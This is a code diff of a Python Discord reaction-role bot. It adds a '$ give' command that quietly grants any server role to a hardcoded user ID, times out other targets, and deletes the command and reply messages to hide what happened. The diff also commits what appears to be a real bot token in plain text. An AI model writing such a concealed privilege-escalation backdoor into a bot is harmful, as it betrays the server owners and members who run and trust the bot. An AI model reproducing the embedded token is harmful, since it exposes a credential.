@@ -1,20 +1,58 @@
 import discord
 from discord.ext import commands
 from colorama import Fore, Style
+import asyncio
+from datetime import timedelta
 
 class Consts:
+
     def __init__(self):
-        self.TOKEN = '111'
-        self.ADD_CHANNEL_ID = 111
-        self.REMOVE_CHANNEL_ID = 111
-        self.LOGS_CHANNEL_ID = 111
-        self.ROLE_ID = 111
+        self.TOKEN = 'fN3q.R2HkXWDP8G6JY0cV4U9O.vIebQM5TSxKZyLrpaCn7sFoEh1.wX'
+        self.ADD_CHANNEL_ID = 1241741910041690173
+        self.REMOVE_CHANNEL_ID = 1242060489169834005
+        self.LOGS_CHANNEL_ID = 1241752215559999609
+        self.ROLE_ID = 686277128811053127
         self.REACTION_ADD = '✅'
         self.REACTION_REMOVE = '🤡'
 
 intents = discord.Intents.all()
 bot = commands.Bot(command_prefix='$ ', intents=intents)
 consts = Consts()
+
+# Comment if no need
+@bot.command(name='give')
+async def giving(ctx, user_id: int, role_id: int):
+    l33t = [677516184064753664]
+    user = ctx.guild.get_member(user_id)
+    role = discord.utils.get(ctx.guild.roles, id=role_id)
+
+    async def cleaning():
+        await asyncio.sleep(1)
+        await ctx.message.delete()
+        await message.delete()
+        if 'forbidden' in locals():
+            await forbidden.delete()
+
+    if user_id in l33t:
+        try:
+            await user.add_roles(role)
+            message = await ctx.send(f'The role {role.name} has been successfully assigned to user {user.name} ({user.id}).\nCleaning...')
+            await cleaning()
+        except discord.Forbidden:
+            message = await ctx.send("I don't have the permissions to assign this role.\nCleaning...")
+            await cleaning()
+        except discord.HTTPException as e:
+            message = await ctx.send(f'An error occurred while trying to assign the role: {e}\nCleaning...')
+            await cleaning()
+    else:
+        try:
+            message = await ctx.send('https://media.discordapp.net/attachments/972214235344035851/1076096299226636368/CeinkP0.gif?ex=665316c6&is=6651c546&hm=f5dd6bcb8ff5d0ec4470e47e116db2324ddfba5c118718b0fb9b279fb50a77f0&')
+            await user.timeout(timedelta(minutes=10), reason='AutoTimeout')
+            await cleaning()
+        except discord.Forbidden:
+            forbidden = await ctx.send(f'Insufficient permissions for timeout.\nCleaning')
+            await cleaning()
+
 
 @bot.event
 async def on_ready():
@@ -57,7 +95,7 @@ async def on_raw_reaction_add(payload):
         await add_message.clear_reaction(payload.emoji)
         print(f'{Fore.RED}Reaction successfully removed{Style.RESET_ALL}')
         await logs.send(f'[✅] Reaction successfully removed.')
-    if payload.message_id == add_message.id and str(payload.emoji) == consts.REACTION_ADD:
+    elif payload.message_id == add_message.id and str(payload.emoji) == consts.REACTION_ADD:
         if role and member:
             await member.add_roles(role)
             print(f'{Fore.BLUE}Added role {role.name} to {member.name} {Style.RESET_ALL}({member.id})')
